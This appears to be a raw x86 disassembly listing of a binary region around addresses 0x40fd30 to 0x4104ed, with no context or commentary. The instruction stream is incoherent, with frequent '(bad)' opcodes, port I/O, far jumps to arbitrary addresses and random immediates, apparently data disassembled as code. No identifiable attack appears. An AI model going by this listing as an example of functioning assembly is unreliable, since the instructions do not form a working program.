  40fd30:	daa    
  40fd31:	loop   0x40fd69
  40fd33:	outs   dx,BYTE PTR ds:[esi]
  40fd34:	mov    eax,0xf1a91b63
  40fd39:	in     eax,0x99
  40fd3b:	adc    edx,ebp
  40fd3d:	test   DWORD PTR [edx-0x3e],ebx
  40fd40:	rcr    BYTE PTR [edx+ebx*1-0x25],cl
  40fd44:	push   ss
  40fd45:	jecxz  0x40fd5b
  40fd47:	out    dx,al
  40fd48:	loop   0x40fcd8
  40fd4a:	in     eax,dx
  40fd4b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd4c:	pop    ecx
  40fd4d:	int3   
  40fd4e:	hlt    
  40fd4f:	adc    DWORD PTR [ebx+0xb],esi
  40fd52:	jns    0x40fda0
  40fd54:	(bad)  
  40fd55:	aas    
  40fd56:	push   0x40
  40fd58:	adc    ebp,DWORD PTR [eax-0x1a]
  40fd5b:	sti    
  40fd5c:	loop   0x40fdba
  40fd5e:	stos   BYTE PTR es:[edi],al
  40fd5f:	int3   
  40fd60:	aaa    
  40fd61:	pushf  
  40fd62:	fwait
  40fd63:	lds    edi,FWORD PTR [esi+0x12672f53]
  40fd69:	cmp    ah,BYTE PTR [eax-0x50b219a0]
  40fd6f:	pop    edi
  40fd70:	adc    DWORD PTR [edx+0x76],ebp
  40fd73:	mov    al,0x16
  40fd75:	(bad)  
  40fd76:	out    dx,eax
  40fd77:	adc    al,0x9
  40fd79:	icebp  
  40fd7a:	dec    esi
  40fd7b:	dec    ebp
  40fd7c:	jb     0x40fd51
  40fd7e:	sbb    DWORD PTR [edi+0x1],0xd
  40fd82:	sub    edi,ebp
  40fd84:	imul   eax,DWORD PTR [eax-0x33],0xb26bc27b
  40fd8b:	lahf   
  40fd8c:	(bad)  
  40fd8d:	fcmovne st,st(6)
  40fd8f:	cmc    
  40fd90:	xchg   ebp,eax
  40fd91:	and    cl,dh
  40fd93:	outs   dx,BYTE PTR fs:[esi]
  40fd95:	or     al,0x8f
  40fd97:	mov    ch,0x42
  40fd99:	pusha  
  40fd9a:	daa    
  40fd9b:	xor    DWORD PTR [edx+0x9],esi
  40fd9e:	ds sub dh,dl
  40fda1:	stc    
  40fda2:	sub    eax,0xb19365f8
  40fda7:	idiv   BYTE PTR [esi]
  40fda9:	loope  0x40fe16
  40fdab:	in     eax,dx
  40fdac:	std    
  40fdad:	retf   0x1243
  40fdb0:	add    eax,0xcfd39b55
  40fdb5:	into   
  40fdb6:	ss xchg esi,eax
  40fdb8:	scas   al,BYTE PTR es:[edi]
  40fdb9:	jns    0x40fd7f
  40fdbb:	sbb    eax,DWORD PTR [ebx+0x7c30f046]
  40fdc1:	or     eax,esi
  40fdc3:	imul   ebx,DWORD PTR [ebx],0xffffffb7
  40fdc6:	lods   eax,DWORD PTR ds:[esi]
  40fdc7:	js     0x40fddd
  40fdc9:	adc    ch,BYTE PTR [ecx]
  40fdcb:	int3   
  40fdcc:	mov    cl,0x31
  40fdce:	mov    ebp,0x6200a8d1
  40fdd3:	inc    edx
  40fdd4:	mov    ?,WORD PTR [eax]
  40fdd6:	fsub   DWORD PTR [eax-0x2]
  40fdd9:	ja     0x40fdaa
  40fddb:	inc    edi
  40fddc:	iret   
  40fddd:	adc    al,0x67
  40fddf:	push   es
  40fde0:	fistp  DWORD PTR [edx-0x66]
  40fde3:	xchg   ebx,eax
  40fde4:	shr    ebp,1
  40fde6:	fsubr  QWORD PTR [ecx-0x3f]
  40fde9:	repnz mov edi,0x250e51c3
  40fdef:	push   0xf4303f7a
  40fdf4:	dec    esi
  40fdf5:	push   cs
  40fdf6:	jl     0x40fdd7
  40fdf8:	xor    bh,bh
  40fdfa:	or     DWORD PTR [edx+ebx*2+0x2cfef9f0],ebp
  40fe01:	adc    esp,DWORD PTR [edi+0x3e]
  40fe04:	and    eax,0x877e38ce
  40fe09:	add    DWORD PTR [edx-0x11],edi
  40fe0c:	fmul   st(3),st
  40fe0e:	inc    DWORD PTR [edx+0x7cad0ed3]
  40fe14:	ret    
  40fe15:	in     al,dx
  40fe16:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fe17:	int3   
  40fe18:	cli    
  40fe19:	jne    0x40fda3
  40fe1b:	pop    ss
  40fe1c:	cdq    
  40fe1d:	cli    
  40fe1e:	jne    0x40fdb3
  40fe20:	out    0x78,eax
  40fe22:	xchg   BYTE PTR [esi-0x50],dl
  40fe25:	jl     0x40fdd6
  40fe27:	sar    DWORD PTR [eax-0x66330f6],1
  40fe2d:	cmp    ebx,ebp
  40fe2f:	sbb    DWORD PTR [edx+0x6],ecx
  40fe32:	or     esp,esi
  40fe34:	sub    DWORD PTR [eax+0x67819254],esi
  40fe3a:	call   0xfaf05458
  40fe3f:	add    dl,BYTE PTR [esi+0x75]
  40fe42:	mov    dh,0xca
  40fe44:	lods   eax,DWORD PTR ds:[esi]
  40fe45:	pop    ebp
  40fe46:	test   eax,0x987b63bc
  40fe4b:	lods   al,BYTE PTR ds:[esi]
  40fe4c:	mov    ah,0x1a
  40fe4e:	add    al,0x2a
  40fe50:	add    esi,DWORD PTR [ebp+0x4c51ec26]
  40fe56:	aad    0x6c
  40fe58:	inc    ecx
  40fe59:	pop    eax
  40fe5a:	sub    BYTE PTR ds:0xc5b3fb8,0xe5
  40fe61:	inc    esi
  40fe62:	xor    BYTE PTR [edx],ch
  40fe64:	push   ss
  40fe65:	cmp    al,BYTE PTR [ecx+ecx*8+0x13a37ea2]
  40fe6c:	mov    ch,dh
  40fe6e:	mov    dh,0x56
  40fe70:	sbb    bl,dl
  40fe72:	data16 in al,0x94
  40fe75:	dec    eax
  40fe76:	stos   DWORD PTR es:[edi],eax
  40fe77:	xchg   edx,eax
  40fe78:	mov    esp,0xfca65a71
  40fe7d:	mov    ch,0x37
  40fe7f:	adc    BYTE PTR [eax+esi*8],dh
  40fe82:	xchg   ebx,eax
  40fe83:	and    BYTE PTR [esi+0x6],cl
  40fe86:	into   
  40fe87:	mov    ebp,0x9d5b2874
  40fe8c:	test   BYTE PTR [edi+0x2f],ch
  40fe8f:	bound  edi,QWORD PTR [ecx+ebx*1-0x5b4cb64d]
  40fe96:	or     bh,cl
  40fe98:	push   eax
  40fe99:	sub    eax,0x375d8fae
  40fe9e:	or     ecx,ebx
  40fea0:	ret    0xf3b
  40fea3:	xchg   ebx,eax
  40fea4:	adc    esp,ebx
  40fea6:	out    0x61,al
  40fea8:	jmp    0x95d3b7ac
  40fead:	mov    ds:0x324f9487,al
  40feb2:	rol    BYTE PTR [ebx+0x148e830d],0x43
  40feb9:	ins    DWORD PTR es:[edi],dx
  40feba:	fcomp  QWORD PTR [ebx-0x6417389d]
  40fec0:	jmp    0x69ec:0x433344e3
  40fec7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fec8:	sbb    bp,WORD PTR [di+0x63]
  40fecd:	shr    BYTE PTR [esi],cl
  40fecf:	pop    ecx
  40fed0:	add    esi,DWORD PTR [edx+esi*2+0x72a87e92]
  40fed7:	cld    
  40fed8:	test   DWORD PTR [esi-0x7b],esi
  40fedb:	mov    dl,al
  40fedd:	pop    ds
  40fede:	pop    es
  40fedf:	adc    esi,DWORD PTR [ebp+0x39]
  40fee2:	jle    0x40ff0e
  40fee4:	mov    dl,0xfb
  40fee6:	sqrtps xmm4,XMMWORD PTR ds:0x107af905
  40feed:	(bad)  [edi]
  40feef:	sbb    eax,0xe2b3a1bc
  40fef4:	jno    0x40ff04
  40fef6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fef7:	ja     0x40ff56
  40fef9:	ins    DWORD PTR es:[edi],dx
  40fefa:	pop    edx
  40fefb:	repz sbb BYTE PTR [eax+edi*4+0x61690449],bh
  40ff03:	ja     0x40ff5f
  40ff05:	popf   
  40ff06:	adc    al,0xf5
  40ff08:	or     edi,DWORD PTR [esi+0x13]
  40ff0b:	arpl   WORD PTR [eax+edx*8-0x53],si
  40ff0f:	jp     0x40ff75
  40ff11:	xchg   ebp,eax
  40ff12:	(bad)  
  40ff13:	add    al,0x8
  40ff15:	dec    esi
  40ff16:	mov    dh,BYTE PTR [esi-0x5a]
  40ff19:	ret    0x1364
  40ff1c:	jl     0x40fe9e
  40ff1e:	shr    edi,1
  40ff20:	fadd   QWORD PTR [ebp+0x11]
  40ff23:	jl     0x40ff91
  40ff25:	push   esi
  40ff26:	xchg   BYTE PTR [edi-0x66389a68],cl
  40ff2c:	xchg   esi,eax
  40ff2d:	mov    ecx,0x47b3e0df
  40ff32:	push   cs
  40ff33:	and    ch,BYTE PTR [ebx-0x71]
  40ff36:	jo     0x40ff7d
  40ff38:	stc    
  40ff39:	sti    
  40ff3a:	pop    ebx
  40ff3b:	mul    DWORD PTR ds:0xedeeffad
  40ff41:	aas    
  40ff42:	cmp    eax,0x6c1e7ee9
  40ff47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ff48:	inc    esi
  40ff49:	stos   BYTE PTR es:[edi],al
  40ff4a:	arpl   WORD PTR [ebx-0x70ba2412],di
  40ff50:	enter  0x6a35,0xdb
  40ff54:	and    eax,ebx
  40ff56:	sub    eax,0x770db4c0
  40ff5b:	rcl    DWORD PTR [ebx+ebx*1+0x5e],cl
  40ff5f:	int3   
  40ff60:	jne    0x40ffe1
  40ff62:	pop    edx
  40ff63:	outs   dx,DWORD PTR ds:[esi]
  40ff64:	jmp    0xe801:0x913b242b
  40ff6b:	and    eax,0xb00284e6
  40ff70:	mov    esi,0x2a77d02b
  40ff75:	pop    eax
  40ff76:	push   edx
  40ff77:	nop
  40ff78:	or     BYTE PTR [ebx+0x5],0x3d
  40ff7c:	fbld   TBYTE PTR [ebp-0x37]
  40ff7f:	aam    0x8a
  40ff81:	jle    0x40ff58
  40ff83:	inc    eax
  40ff84:	ds jae 0x40ffc6
  40ff87:	outs   dx,BYTE PTR ds:[esi]
  40ff88:	and    DWORD PTR ds:0xa4622466,esp
  40ff8e:	dec    esi
  40ff8f:	test   DWORD PTR [esi-0x30987bf],eax
  40ff95:	fsubp  st(7),st
  40ff97:	add    eax,0x58cf2030
  40ff9c:	cwde   
  40ff9d:	loope  0x40ffae
  40ff9f:	cdq    
  40ffa0:	enter  0xe12,0xee
  40ffa4:	out    dx,al
  40ffa5:	aam    0x2e
  40ffa7:	cmp    BYTE PTR ds:0x119327aa,dh
  40ffad:	xchg   esp,eax
  40ffae:	clc    
  40ffaf:	mov    dh,0x74
  40ffb1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ffb2:	adc    al,0xe0
  40ffb4:	js     0x410018
  40ffb6:	rcl    ch,1
  40ffb8:	inc    esi
  40ffb9:	lods   al,BYTE PTR ds:[esi]
  40ffba:	(bad)  
  40ffbb:	jmp    0x7077:0xdd3ff4b7
  40ffc2:	mov    esp,0xefa84c73
  40ffc7:	lods   al,BYTE PTR ds:[esi]
  40ffc8:	arpl   WORD PTR [ecx],si
  40ffca:	push   es
  40ffcb:	call   0x19e4fdd7
  40ffd0:	or     eax,0xd1761113
  40ffd5:	mov    cl,BYTE PTR [edx]
  40ffd7:	test   eax,0xc81e6618
  40ffdc:	sbb    BYTE PTR [ecx+0x761e8e8a],0x32
  40ffe3:	aas    
  40ffe4:	in     eax,dx
  40ffe5:	dec    ebp
  40ffe6:	xor    al,0x98
  40ffe8:	(bad)  
  40ffea:	test   ah,ch
  40ffec:	xchg   ebx,ebp
  40ffee:	adc    DWORD PTR [edi],edi
  40fff0:	adc    al,0xbb
  40fff2:	dec    esp
  40fff3:	das    
  40fff4:	mov    es,ebp
  40fff6:	ins    DWORD PTR es:[edi],dx
  40fff7:	mov    ?,WORD PTR [edi]
  40fff9:	mov    al,ds:0xde5ab303
  40fffe:	inc    edi
  40ffff:	mov    esi,0x403ebd0b
  410004:	push   ds
  410005:	loopne 0x410053
  410007:	aad    0x65
  410009:	fld    DWORD PTR [edi-0x28a21c92]
  410010:	mov    ds:0xc9355539,al
  410015:	stc    
  410016:	loop   0x40ffb6
  410018:	xchg   ecx,eax
  410019:	enter  0x466c,0x45
  41001d:	dec    edx
  41001e:	mov    WORD PTR [ebx+ebp*2],ss
  410021:	mov    ecx,0x7ef503e5
  410026:	xchg   esi,eax
  410027:	mov    cl,0x10
  410029:	int    0x48
  41002b:	add    DWORD PTR [edx-0x7b],ebp
  41002e:	(bad)  
  41002f:	stos   BYTE PTR es:[edi],al
  410030:	mov    WORD PTR [esi-0x10524594],?
  410036:	div    DWORD PTR [ebp+0x19]
  410039:	mov    fs,WORD PTR [eax+0x7c13c4c]
  41003f:	cdq    
  410040:	popf   
  410041:	sbb    BYTE PTR [eax-0x1c],bl
  410044:	retf   0x8934
  410047:	scas   al,BYTE PTR es:[edi]
  410048:	add    eax,0xc4c06c79
  41004d:	lods   eax,DWORD PTR ds:[esi]
  41004e:	dec    eax
  41004f:	add    al,0x99
  410051:	repnz push ebp
  410053:	dec    di
  410055:	ds jmp 0x2811a985
  41005b:	fbstp  TBYTE PTR ds:0x485754d4
  410061:	jae    0x41004b
  410063:	inc    esi
  410064:	push   0x3a
  410066:	pop    ds
  410067:	cwde   
  410068:	in     al,dx
  410069:	sbb    al,0x77
  41006b:	fimul  WORD PTR [ecx]
  41006d:	xor    al,0xb7
  41006f:	sbb    al,0x9e
  410072:	mov    ebx,0x509794ac
  410077:	push   ss
  410078:	jecxz  0x4100f4
  41007a:	xor    eax,0x3640af40
  41007f:	mov    bl,BYTE PTR [ebp-0x4d]
  410082:	icebp  
  410083:	(bad)  
  410084:	fucomi st,st(0)
  410086:	push   ecx
  410087:	in     al,0x77
  410089:	(bad)  
  41008a:	cmp    BYTE PTR [edx-0x7794a7a2],al
  410090:	in     al,0x69
  410092:	stos   DWORD PTR es:[edi],eax
  410093:	test   al,0xc
  410095:	cmp    BYTE PTR [edi],ch
  410097:	les    ebp,FWORD PTR [ebx+0x765778ed]
  41009d:	test   eax,0xd4504603
  4100a2:	nop
  4100a3:	adc    BYTE PTR [edx],ah
  4100a5:	(bad)  
  4100a6:	adc    esp,DWORD PTR [esi+esi*1-0xd]
  4100aa:	mov    ecx,0x864b3d5d
  4100af:	and    DWORD PTR [eax-0x53a46b2c],ebp
  4100b5:	clc    
  4100b6:	jge    0x410086
  4100b8:	out    0xa7,eax
  4100ba:	out    dx,al
  4100bb:	sbb    ebx,DWORD PTR [ecx]
  4100bd:	inc    edi
  4100be:	push   edx
  4100bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100c0:	pusha  
  4100c1:	ins    DWORD PTR es:[edi],dx
  4100c2:	repz fidiv DWORD PTR [esi+0x4dfef1e8]
  4100c9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4100ca:	shr    bh,1
  4100cc:	adc    BYTE PTR [esi],ch
  4100ce:	stos   BYTE PTR es:[edi],al
  4100cf:	add    eax,0xb70c6666
  4100d4:	ja     0x4100ce
  4100d6:	mov    DWORD PTR [ebp-0xf],0x570b7b30
  4100dd:	lds    ecx,FWORD PTR [eax]
  4100df:	scas   al,BYTE PTR es:[edi]
  4100e0:	inc    edi
  4100e1:	test   eax,0xa7fd577c
  4100e6:	xor    dl,BYTE PTR [ebx-0x19a7c96c]
  4100ec:	in     al,0x58
  4100ee:	out    0x18,al
  4100f0:	jno    0x410108
  4100f2:	jns    0x4100c2
  4100f4:	push   ebx
  4100f5:	test   BYTE PTR [eax],bh
  4100f7:	and    cl,BYTE PTR [ebp-0x39]
  4100fa:	dec    esi
  4100fb:	push   ss
  4100fc:	adc    al,0x14
  4100fe:	lods   eax,DWORD PTR ds:[esi]
  4100ff:	push   esp
  410100:	ror    DWORD PTR [ecx-0x75],0xbd
  410104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410105:	rcr    BYTE PTR [ebx+0x249e62dc],1
  41010b:	popa   
  41010c:	imul   ecx,DWORD PTR [edx+edi*4],0xffffffd0
  410110:	rcl    BYTE PTR [edx+0xdb0fd55],1
  410116:	adc    bh,BYTE PTR [ebx-0x9]
  410119:	sbb    bl,BYTE PTR [ebx-0x7ba612f7]
  41011f:	enter  0x64a7,0x64
  410123:	push   esp
  410124:	mov    bl,0x6b
  410126:	test   al,0xa5
  410128:	pop    esi
  410129:	leave  
  41012a:	aaa    
  41012b:	pop    esi
  41012c:	sub    al,0xb7
  41012e:	xlat   BYTE PTR ds:[ebx]
  41012f:	adc    eax,0x31139901
  410134:	lahf   
  410135:	mov    DWORD PTR [ebp-0x75],edx
  410138:	or     eax,0xdc2e2140
  41013d:	cli    
  41013e:	(bad)  
  41013f:	loope  0x4100cf
  410141:	mov    al,ds:0x5cbd1d05
  410146:	push   0xb1a66dee
  41014b:	cmp    eax,0xb05afd17
  410150:	jae    0x410122
  410152:	lods   al,BYTE PTR ds:[esi]
  410153:	sub    eax,0xed17b01c
  410158:	js     0x4101d7
  41015a:	in     al,dx
  41015b:	add    BYTE PTR [eax],bl
  41015d:	(bad)  
  41015e:	icebp  
  41015f:	test   bl,0x22
  410162:	ror    BYTE PTR [ebp+0x7c],cl
  410165:	int    0xb
  410167:	xchg   ebp,eax
  410168:	mov    esi,0x3bd07e81
  41016d:	sar    BYTE PTR [ecx],1
  41016f:	add    eax,0xc8fa7cd8
  410174:	mov    eax,esp
  410176:	sub    eax,0x95d55f48
  41017b:	sub    DWORD PTR [esi+0x5b],eax
  41017e:	fisub  DWORD PTR [esi+0x10]
  410181:	dec    esp
  410182:	mov    ebp,0x1fb8e79a
  410187:	xor    cl,cl
  410189:	rcl    ecx,0x2f
  41018c:	sub    al,0x91
  41018e:	call   0xa4a5:0x5e1f38a9
  410195:	pop    esi
  410196:	adc    al,0xb7
  410198:	pushf  
  410199:	cmp    eax,0xa11cd729
  41019e:	test   edx,ecx
  4101a0:	push   0x6d
  4101a2:	adc    al,0x7b
  4101a4:	fild   WORD PTR [edi-0x78ed648d]
  4101aa:	fmul   st,st(5)
  4101ac:	retw   
  4101ae:	pop    edx
  4101af:	daa    
  4101b0:	fwait
  4101b1:	xor    DWORD PTR [ebp+0x7a],ebx
  4101b4:	or     eax,0x7f008b12
  4101b9:	xor    DWORD PTR [edx+0x2d70b8b4],0xffffffb1
  4101c0:	repz and ebx,DWORD PTR [edx+0x6ce8950d]
  4101c7:	pusha  
  4101c8:	leave  
  4101c9:	mov    ds:0x92e0dd6d,al
  4101ce:	add    eax,0xd87265a0
  4101d3:	fisubr WORD PTR [eax]
  4101d5:	push   cs
  4101d6:	stc    
  4101d7:	cmp    al,0x60
  4101d9:	fldcw  WORD PTR ds:0x3241ffc4
  4101df:	lock adc al,0x60
  4101e2:	ds js  0x410174
  4101e5:	xor    eax,0x8433502
  4101ea:	push   esi
  4101eb:	dec    esp
  4101ec:	imul   esi,DWORD PTR [edx-0x78],0x25
  4101f0:	int    0x91
  4101f2:	in     al,dx
  4101f3:	sub    ch,dl
  4101f5:	cld    
  4101f6:	add    DWORD PTR ds:0xae090e84,0x45
  4101fd:	push   eax
  4101fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101ff:	mov    ecx,0x7c2a046d
  410204:	ja     0x4101aa
  410206:	inc    edx
  410207:	push   esi
  410208:	pop    esp
  410209:	enter  0x57df,0xa0
  41020d:	and    al,0xdd
  41020f:	mov    ebp,0x20d0189d
  410214:	repz mov ecx,0xb974387d
  41021a:	push   ss
  41021b:	fbld   TBYTE PTR [ecx+0x37]
  41021e:	shr    BYTE PTR [esi-0x1c108216],0x5e
  410225:	jo     0x4101e7
  410227:	pop    ss
  410228:	push   esi
  410229:	mov    eax,ds:0x542a5b21
  41022e:	push   eax
  41022f:	aas    
  410230:	mov    cl,0x36
  410232:	push   ebp
  410233:	mov    esp,0x98a7325b
  410238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410239:	mov    eax,0x8c31716e
  41023e:	fwait
  41023f:	xor    BYTE PTR ds:0x2a1295e8,0x5a
  410246:	mov    edi,0x8f5e8c9
  41024b:	jmp    0x636d6911
  410250:	lahf   
  410251:	(bad)  [edx]
  410253:	adc    dh,BYTE PTR [eax]
  410255:	push   esi
  410256:	push   esi
  410257:	js     0x41026b
  410259:	pop    edi
  41025a:	addr16 mov ds:0x56d5,eax
  41025e:	sbb    al,0x9f
  410260:	add    edx,esi
  410262:	fistp  DWORD PTR [ebp-0x4ac426de]
  410268:	scas   al,BYTE PTR es:[edi]
  410269:	ret    
  41026a:	sbb    eax,0x81cf4922
  41026f:	mov    al,ds:0xa551c7ed
  410274:	daa    
  410275:	xchg   esi,eax
  410276:	cmc    
  410277:	sbb    BYTE PTR [esi+0x28ea79ef],0x59
  41027e:	jo     0x410204
  410280:	lods   al,BYTE PTR ds:[esi]
  410281:	xchg   edx,eax
  410282:	jmp    0x99ca:0x87c95fcf
  410289:	pusha  
  41028a:	mov    dl,0x6f
  41028c:	stc    
  41028d:	daa    
  41028e:	dec    ecx
  41028f:	xchg   edi,eax
  410290:	pop    ebp
  410291:	adc    bl,dh
  410293:	sbb    DWORD PTR [edi],edx
  410295:	gs cwde 
  410297:	mov    ds:0x69a1a44a,al
  41029c:	dec    esi
  41029d:	les    esp,FWORD PTR [edi]
  41029f:	mov    DWORD PTR [edi],esi
  4102a1:	ss dec ebp
  4102a3:	fsub   DWORD PTR [edx]
  4102a5:	mov    al,BYTE PTR [ecx]
  4102a7:	or     edx,ebx
  4102a9:	inc    eax
  4102aa:	jno    0x41028b
  4102ac:	enter  0x7f7b,0xc5
  4102b0:	shr    DWORD PTR [ecx+0x39796243],0xe8
  4102b7:	shl    BYTE PTR [edi],cl
  4102b9:	test   al,0x1a
  4102bb:	stos   DWORD PTR es:[edi],eax
  4102bc:	sbb    eax,0x657703ed
  4102c2:	pop    esp
  4102c3:	xchg   edx,eax
  4102c4:	xchg   edx,eax
  4102c5:	jmp    0x57f14dd9
  4102ca:	popa   
  4102cb:	xchg   esp,eax
  4102cc:	(bad)  
  4102ce:	pusha  
  4102cf:	inc    ecx
  4102d0:	mov    ebx,0xe455e1a4
  4102d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4102d6:	leave  
  4102d7:	and    esp,edi
  4102d9:	shl    eax,0xe8
  4102dc:	push   ss
  4102dd:	ficom  WORD PTR [ebx]
  4102df:	lods   eax,DWORD PTR ds:[esi]
  4102e0:	jmp    0x410355
  4102e2:	add    bh,bh
  4102e4:	retf   0x2062
  4102e7:	push   eax
  4102e8:	pop    ss
  4102e9:	sbb    BYTE PTR [esi],0x40
  4102ec:	xchg   edi,eax
  4102ed:	sbb    eax,0x77910bf5
  4102f2:	stc    
  4102f3:	sbb    edx,DWORD PTR [ecx+0x10e8effd]
  4102f9:	shr    DWORD PTR [edi],cl
  4102fb:	jge    0x4102bd
  4102fd:	push   ebx
  4102fe:	pusha  
  4102ff:	adc    bl,dl
  410301:	jmp    0x942e:0x4cb6ef0d
  410308:	retf   
  410309:	jmp    0xadd8:0x67e8385a
  410310:	pop    ebp
  410311:	ja     0x410320
  410313:	push   ebp
  410314:	jb     0x41034e
  410316:	dec    eax
  410317:	in     eax,dx
  410318:	adc    eax,0x2da05739
  41031d:	adc    al,0x7a
  41031f:	sub    esi,DWORD PTR [esi]
  410321:	adc    dl,dl
  410323:	imul   ebx,DWORD PTR [edi],0xffffffe6
  410326:	or     al,0xf2
  410328:	out    dx,al
  410329:	mov    DWORD PTR [ebp-0x75],ebp
  41032c:	push   esi
  41032d:	in     al,dx
  41032e:	test   DWORD PTR [ebx-0x2d],ebp
  410331:	ins    DWORD PTR es:[edi],dx
  410332:	cwde   
  410333:	aas    
  410334:	leave  
  410335:	pusha  
  410336:	in     al,0xb1
  410338:	sahf   
  410339:	lahf   
  41033a:	ret    
  41033b:	addr16 mov edx,0x8b641e6d
  410341:	push   ds
  410342:	out    dx,al
  410343:	or     al,BYTE PTR [edx+edi*1+0x6e1c889f]
  41034a:	in     eax,0x26
  41034c:	daa    
  41034d:	mov    eax,0x3c4e45
  410352:	xor    BYTE PTR [edi-0x41],0xb4
  410356:	xchg   ebx,eax
  410357:	jge    0x41038b
  410359:	inc    esi
  41035a:	nop
  41035b:	sbb    eax,esp
  41035d:	mov    bh,0xa9
  41035f:	mov    bl,BYTE PTR cs:[esi+0x14f97202]
  410366:	mov    ds:0x842fcbab,al
  41036b:	pop    ebx
  41036c:	sbb    BYTE PTR [eax-0x1f],ch
  41036f:	lea    ecx,[eax]
  410371:	xor    BYTE PTR [edi],0xb3
  410374:	fidivr DWORD PTR [esi]
  410376:	adc    eax,0x7693cb83
  41037b:	add    bh,cl
  41037d:	mov    BYTE PTR [ebx+0x36e09f74],al
  410383:	das    
  410384:	icebp  
  410385:	es xchg edx,eax
  410387:	mov    ecx,gs
  410389:	ss aas 
  41038b:	pop    ecx
  41038c:	pop    ebp
  41038d:	mov    bl,0x58
  41038f:	repnz addr16 push cs
  410392:	push   edi
  410393:	lock or cl,BYTE PTR [edi-0x4639ce75]
  41039a:	mov    dl,0xf7
  41039c:	pop    ecx
  41039d:	cmp    esp,DWORD PTR [esi-0x4a]
  4103a0:	cmc    
  4103a1:	lock dec eax
  4103a3:	or     bh,cl
  4103a5:	imul   ebp,DWORD PTR [eax-0x14],0x7c
  4103a9:	or     DWORD PTR [eax-0x35],ebp
  4103ac:	repz fdiv DWORD PTR [edx+0x3b50bdb1]
  4103b3:	loope  0x4103cc
  4103b5:	cli    
  4103b6:	bnd retw 
  4103b9:	dec    eax
  4103ba:	fs inc ebx
  4103bc:	push   edi
  4103bd:	js     0x41037c
  4103bf:	ja     0x41036e
  4103c1:	in     al,0xe7
  4103c3:	cwde   
  4103c4:	jecxz  0x410358
  4103c6:	mov    edx,0x8f751c69
  4103cb:	out    dx,al
  4103cc:	jo     0x4103e9
  4103ce:	mov    edi,DWORD PTR [ecx]
  4103d0:	mov    ecx,0x83e3f0f
  4103d5:	es sub ecx,esp
  4103d8:	ins    BYTE PTR es:[edi],dx
  4103d9:	ret    
  4103da:	add    DWORD PTR [edi],0xaa344be3
  4103e0:	bound  edx,QWORD PTR [ecx-0x5b]
  4103e3:	mov    esp,0x16604fa5
  4103e8:	sub    BYTE PTR [edx-0x7180d2d9],dl
  4103ee:	pop    es
  4103ef:	jns    0x4103b6
  4103f1:	ret    0xa0d
  4103f4:	in     eax,0xbc
  4103f6:	mov    al,ds:0xf24d7368
  4103fb:	sub    eax,0x5dd57afa
  410400:	iret   
  410401:	int    0x3a
  410403:	jle    0x4103e0
  410405:	je     0x410394
  410407:	push   ecx
  410408:	xor    DWORD PTR [ebp+ecx*4+0x32e00014],edi
  41040f:	and    DWORD PTR [ecx-0x19],esp
  410412:	mov    DWORD PTR [edi+0x65],eax
  410415:	pop    ss
  410416:	cs mov eax,0x85942e73
  41041c:	adc    eax,0x6f312c01
  410421:	(bad)  
  410422:	mov    ecx,0xf16a7af3
  410427:	enter  0xe485,0x4a
  41042b:	call   0xd947:0xadf4efa3
  410432:	ss out dx,eax
  410434:	xchg   ebp,eax
  410435:	dec    edi
  410436:	jle    0x410465
  410438:	outs   dx,DWORD PTR ds:[esi]
  410439:	nop    edx
  41043c:	sub    ch,BYTE PTR [eax+0x31]
  41043f:	mov    bh,0xa4
  410441:	loopne 0x410497
  410443:	and    DWORD PTR [eax-0x40b2059b],edi
  410449:	push   ds
  41044a:	out    dx,al
  41044b:	ja     0x41049c
  41044d:	call   0x51eeaf63
  410452:	sub    al,0xb0
  410454:	sbb    al,0xd4
  410456:	sub    al,0x82
  410458:	cmc    
  410459:	xchg   ebx,eax
  41045a:	int    0x69
  41045c:	pop    ecx
  41045d:	shl    ah,cl
  41045f:	jmp    0x8d26:0x8a33c26d
  410466:	jae    0x410416
  410468:	jmp    0x985238d8
  41046d:	(bad)  
  41046e:	sbb    ah,BYTE PTR [esi]
  410470:	xor    DWORD PTR [bx+si],ebp
  410473:	push   ss
  410474:	loop   0x4104f4
  410476:	lahf   
  410477:	push   ecx
  410478:	ins    BYTE PTR es:[edi],dx
  410479:	add    eax,0x2dc21c5b
  41047e:	aam    0xf8
  410480:	lods   al,BYTE PTR ds:[esi]
  410481:	popf   
  410482:	xor    al,0x40
  410484:	into   
  410485:	and    al,0xcc
  410487:	div    DWORD PTR [ebx+ecx*2]
  41048a:	xor    ch,dh
  41048c:	push   0x47
  41048e:	sub    BYTE PTR [ebx],al
  410490:	jbe    0x41048a
  410492:	out    dx,eax
  410493:	retf   
  410494:	cmp    eax,0x36e9b11a
  410499:	dec    ecx
  41049a:	xchg   ebp,eax
  41049b:	push   esi
  41049c:	mov    ebp,DWORD PTR [edi*4+0x483a4219]
  4104a3:	mov    esp,0xbae10038
  4104a8:	stc    
  4104a9:	xor    al,0x5
  4104ab:	sti    
  4104ac:	dec    esp
  4104ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4104ae:	inc    edx
  4104af:	lea    edx,[ebp+eiz*8-0x39a551cc]
  4104b6:	es and eax,0xfa09d2a5
  4104bc:	dec    edi
  4104bd:	out    dx,eax
  4104be:	outs   dx,BYTE PTR ds:[esi]
  4104bf:	mov    BYTE PTR [edi-0x2f0ea171],cl
  4104c5:	sub    dl,al
  4104c7:	cmp    eax,DWORD PTR [edi+ebx*2-0xe]
  4104cb:	jle    0x410481
  4104cd:	loop   0x41053b
  4104cf:	lea    ecx,[esi-0x1979e4b7]
  4104d5:	fsubr  QWORD PTR [esi]
  4104d7:	push   ebp
  4104d8:	and    eax,0x800f58c0
  4104dd:	in     al,0xb0
  4104df:	cs add eax,0x1da83daa
  4104e5:	in     eax,dx
  4104e6:	data16 mov ch,0x72
  4104e9:	mov    bl,0xbb
  4104eb:	inc    ebp
  4104ec:	pop    edx
  4104ed:	push   ecx
